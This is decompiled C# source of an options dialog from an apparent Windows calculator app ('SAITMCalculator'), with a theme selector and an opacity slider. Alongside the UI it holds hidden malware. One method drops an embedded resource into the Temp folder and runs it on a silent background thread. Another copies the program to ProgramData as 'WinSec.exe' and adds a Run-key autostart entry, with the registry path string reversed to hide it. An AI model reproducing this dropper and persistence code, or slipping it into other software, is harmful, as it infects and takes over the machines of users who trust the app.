using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace SAITMCalculator;

[DesignerGenerated]
public class Dialog1 : Form
{
	private IContainer icontainer_0;

	private Bitmap bitmap_0;

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button OK_Button
	{
		[CompilerGenerated]
		get
		{
			return _OK_Button;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_0;
			Button oK_Button = _OK_Button;
			if (oK_Button != null)
			{
				((Control)oK_Button).remove_Click(eventHandler);
			}
			_OK_Button = value;
			oK_Button = _OK_Button;
			if (oK_Button != null)
			{
				((Control)oK_Button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Cancel_Button
	{
		[CompilerGenerated]
		get
		{
			return _Cancel_Button;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_2;
			Button cancel_Button = _Cancel_Button;
			if (cancel_Button != null)
			{
				((Control)cancel_Button).remove_Click(eventHandler);
			}
			_Cancel_Button = value;
			cancel_Button = _Cancel_Button;
			if (cancel_Button != null)
			{
				((Control)cancel_Button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ComboBox1")]
	internal virtual ComboBox ComboBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TrackBar track_option
	{
		[CompilerGenerated]
		get
		{
			return _track_option;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_3;
			TrackBar val = _track_option;
			if (val != null)
			{
				val.remove_Scroll(eventHandler);
			}
			_track_option = value;
			val = _track_option;
			if (val != null)
			{
				val.add_Scroll(eventHandler);
			}
		}
	}

	public Dialog1()
	{
		Class8.BpPkGHSz2q2OL();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Dialog1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_012d: Expected O, but got Unknown
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Expected O, but got Unknown
		TableLayoutPanel1 = new TableLayoutPanel();
		OK_Button = new Button();
		Cancel_Button = new Button();
		ComboBox1 = new ComboBox();
		Label1 = new Label();
		track_option = new TrackBar();
		((Control)TableLayoutPanel1).SuspendLayout();
		((ISupportInitialize)track_option).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TableLayoutPanel1).set_Anchor((AnchorStyles)10);
		TableLayoutPanel1.set_ColumnCount(2);
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		TableLayoutPanel1.get_Controls().Add((Control)(object)OK_Button, 0, 0);
		TableLayoutPanel1.get_Controls().Add((Control)(object)Cancel_Button, 1, 0);
		((Control)TableLayoutPanel1).set_Location(new Point(277, 70));
		((Control)TableLayoutPanel1).set_Name("TableLayoutPanel1");
		TableLayoutPanel1.set_RowCount(1);
		TableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 50f));
		((Control)TableLayoutPanel1).set_Size(new Size(146, 29));
		((Control)TableLayoutPanel1).set_TabIndex(0);
		((Control)OK_Button).set_Anchor((AnchorStyles)0);
		((Control)OK_Button).set_Location(new Point(3, 3));
		((Control)OK_Button).set_Name("OK_Button");
		((Control)OK_Button).set_Size(new Size(67, 23));
		((Control)OK_Button).set_TabIndex(0);
		((ButtonBase)OK_Button).set_Text("OK");
		((Control)Cancel_Button).set_Anchor((AnchorStyles)0);
		Cancel_Button.set_DialogResult((DialogResult)2);
		((Control)Cancel_Button).set_Location(new Point(76, 3));
		((Control)Cancel_Button).set_Name("Cancel_Button");
		((Control)Cancel_Button).set_Size(new Size(67, 23));
		((Control)Cancel_Button).set_TabIndex(1);
		((ButtonBase)Cancel_Button).set_Text("Cancel");
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		((Control)ComboBox1).set_Location(new Point(22, 39));
		((Control)ComboBox1).set_Name("ComboBox1");
		((Control)ComboBox1).set_Size(new Size(241, 21));
		((Control)ComboBox1).set_TabIndex(1);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.DarkGray);
		((Control)Label1).set_Location(new Point(19, 10));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(54, 18));
		((Control)Label1).set_TabIndex(2);
		Label1.set_Text("Theme");
		((Control)track_option).set_Location(new Point(18, 66));
		((Control)track_option).set_Name("track_option");
		((Control)track_option).set_Size(new Size(245, 45));
		((Control)track_option).set_TabIndex(3);
		((Form)this).set_AcceptButton((IButtonControl)(object)OK_Button);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.WhiteSmoke);
		((Form)this).set_CancelButton((IButtonControl)(object)Cancel_Button);
		((Form)this).set_ClientSize(new Size(435, 118));
		((Control)this).get_Controls().Add((Control)(object)track_option);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)TableLayoutPanel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Dialog1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Form)this).set_Text("Option");
		((Control)TableLayoutPanel1).ResumeLayout(false);
		((ISupportInitialize)track_option).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void method_0(object sender, EventArgs e)
	{
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(ComboBox1.get_SelectedItem(), (object)"Wood Style", false))
		{
			bitmap_0 = Class6.smethod_0();
		}
		if (Operators.ConditionalCompareObjectEqual(ComboBox1.get_SelectedItem(), (object)"Nature Elaborate", false))
		{
			bitmap_0 = Class6.smethod_1();
		}
		if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(ComboBox1.get_SelectedItem(), (object)"", false))))
		{
			Interaction.MsgBox((object)("Selected Theme is : " + ComboBox1.get_SelectedItem().ToString()), (MsgBoxStyle)0, (object)null);
			((Control)Class2.Class3_0.Form1).set_BackgroundImage((Image)(object)bitmap_0);
		}
		((Form)this).Close();
	}

	private void method_1()
	{
		string text = "Temp";
		string lunch = Class2.Class3_0.Form1.lunch;
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(lunch);
		using (FileStream destination = new FileStream(Path.Combine(Interaction.Environ(text), lunch), FileMode.Create, FileAccess.Write))
		{
			stream.CopyTo(destination);
		}
		Process.Start(Path.Combine(Interaction.Environ(text), lunch));
	}

	private void method_2(object sender, EventArgs e)
	{
		((Form)Class2.Class3_0.Form1).set_Opacity(0.9);
		((Form)this).Close();
	}

	private void Dialog1_Load(object sender, EventArgs e)
	{
		ComboBox1.get_Items().Add((object)"Nature Elaborate");
		ComboBox1.get_Items().Add((object)"Wood Style");
	}

	public object will()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			snatch();
		});
		thread.IsBackground = true;
		thread.Start();
		return true;
	}

	public object snatch()
	{
		try
		{
			method_1();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void designer()
	{
		string text = "WinSec.exe";
		string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), text);
		try
		{
			if (Operators.CompareString(text2, Application.get_ExecutablePath(), false) != 0)
			{
				File.Copy(Application.get_ExecutablePath(), text2, overwrite: true);
				Registry.CurrentUser.CreateSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS")).SetValue(text, text2);
				Process.Start(text2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		((Form)Class2.Class3_0.Form1).set_Opacity((double)track_option.get_Value() / 10.0);
	}
}
